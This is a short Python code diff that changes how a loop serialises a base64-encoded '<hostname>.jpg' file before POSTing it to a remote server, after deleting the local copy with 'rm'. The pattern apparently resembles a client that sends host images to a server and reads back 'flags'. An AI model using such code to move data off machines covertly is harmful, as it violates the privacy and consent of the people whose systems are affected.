@@ -26,9 +26,10 @@ while arch:
         with open('{}.jpg'.format(hostname), 'rb') as f:
             img = f.read()
             img = base64.b64encode(img).decode()
-            _obj['file'] = json.dumps(img)
+            _obj['file'] = img
         subprocess.run(['rm', '{}.jpg'.format(hostname)])
     conn = http.HTTPConnection("{}:80".format(server_ip))
+    _obj = json.dumps(_obj)
     _obj = _obj.encode()
     conn.request("POST", server_path, _obj, headers)
     json_flags = conn.getresponse().read().decode()
